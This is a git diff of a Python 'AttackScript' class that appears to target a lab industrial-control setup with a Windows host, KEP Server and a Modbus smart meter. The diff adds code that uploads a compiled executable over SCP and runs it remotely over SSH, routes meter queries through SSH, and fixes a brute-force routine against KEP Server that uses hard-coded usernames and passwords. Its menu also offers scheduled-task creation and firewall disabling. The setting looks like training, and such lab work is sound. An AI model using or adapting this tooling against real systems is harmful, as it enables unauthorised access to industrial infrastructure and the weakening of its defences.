@@ -21,6 +21,7 @@ import json
 import sys
 # from Powershell.callPowerShell import runPowerShellScript
 import paramiko
+from scp import SCPClient
 
 class AttackScript:
     def __init__(self, ip, username = "Student", password = "Student12345@"):
@@ -44,7 +45,8 @@ class AttackScript:
 
         # Path for the Modpoll
         # TODO: Either a modpoll path finder or make a modpoll unpacker
-        self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
+        # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
+        self.MODPOLL_PATH = r"C:\Users\Student"
 
 
 ###########
@@ -90,14 +92,14 @@ class AttackScript:
 
         try:
             # Connect to the remote server, prioritizing private key over password
-            if self.PRIVATE_KEY_PATH is not None:
-                # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
-                private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
-                # Connect using the private key
-                ssh.connect(host=self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
-            elif self.PASSWORD is not None:
+            # if self.PRIVATE_KEY_PATH is not None:
+            #     # Note that Ed25519 was used for the generation. If it is RSA, use "paramiko.RSAKey.from_private_key_file()" instead
+            #     private_key = paramiko.Ed25519Key.from_private_key_file(self.PRIVATE_KEY_PATH)
+            #     # Connect using the private key
+            #     ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, pkey=private_key)
+            if self.PASSWORD is not None:
                 # Connect using password
-                ssh.connect(host=self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+                ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
             else:
                 # Handle case when neither password nor private key is provided
                 print("Please provide either a password or a private key.")
@@ -121,7 +123,6 @@ class AttackScript:
         except Exception as e:
             print(f"An error occurred: {e}")
             return None
-
         ssh.close()
         # Return the output
         return ssh_output
@@ -492,7 +493,7 @@ class AttackScript:
         Bruteforces the usernames and passwords of the KEP Server.
         """
 
-        self.kep_server_start(self)
+        self.kep_server_start()
 
         usernames = ["Admin", "Administrator"]
         passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
@@ -585,18 +586,15 @@ class AttackScript:
     def smartmeter_get_hardware_info(self):
         self.kep_server_stop()
 
-        current_directory = getcwd()
-        executable_path = current_directory + "\\modpoll.exe"
+        executable_path = self.MODPOLL_PATH + "\\modpoll.exe"
 
         baudrate = self.baudrate_check()
         if baudrate in ["4800", "9600", "19200"]:
             parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
-            # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
-            # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
-            firmwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+            firmwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             parameters[9] = "9006" # DPM33 Address for reading hardwareOutput
-            hardwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+            hardwareOutput = self.ssh_run_command(f"{executable_path} {' '.join(parameters)}").replace("\n", " ").split(" ")
 
             # TODO: For "cannot be detected" stuff, raise an exception
             if "[9005]:" in firmwareOutput:
@@ -1216,6 +1214,33 @@ class AttackScript:
             return True
         return False
 
+    def dummy_test(self) -> None:
+        print("Hello, I am very cooool")
+
+    def exe(self):
+        # compiled_exe_output = run(["pyinstaller", "-F", "--onefile", sys.argv[0]], stdout=PIPE)
+        executable = sys.argv[0][:-3] + ".exe"
+        # command_output = self.ssh_run_command(f"scp dist/{sys.argv[0][:-3]}.exe {self.USERNAME}@{self.WINDOWS_SERVER_IP}:")
+
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        ssh.connect(self.WINDOWS_SERVER_IP, username=self.USERNAME, password=self.PASSWORD)
+        ssh_transport = ssh.get_transport() # TODO: Try to increase ssh transport speed
+        ssh_transport.default_window_size = 2147483647
+        ssh_transport.packetizer.REKEY_BYTES = pow(2, 40)
+        ssh_transport.packetizer.REKEY_PACKETS = pow(2, 40)
+        scp = SCPClient(ssh_transport, progress4=self.progress4)
+        print(sys.argv[0][:-3])
+        scp.put(f"dist/{sys.argv[0][:-3]}.exe", remote_path=f"{self.MODPOLL_PATH}/{sys.argv[0][:-3]}.exe")
+
+        # Close the SCP client
+        scp.close() 
+
+        print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
+    
+    def progress4(self, filename, size, sent, peername):
+        sys.stdout.write("(%s:%s) %s's progress: %.2f%%   \r" % (peername[0], peername[1], filename, float(sent)/float(size)*100) )
     ########
     # MAIN #
     ########
@@ -1226,6 +1251,9 @@ class AttackScript:
         #     check_admin()
 
         match attack_option:
+            case "exe": self.exe()
+            case "cool": self.dummy_test()
+            case "start": self.kep_server_start()
             case "1":  self.create_scheduled_task() # TODO: Determine if this function is depricated or can be modified
             #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH) # TODO: Determine if this function is depricated
             case "3":  self.disable_firewall()
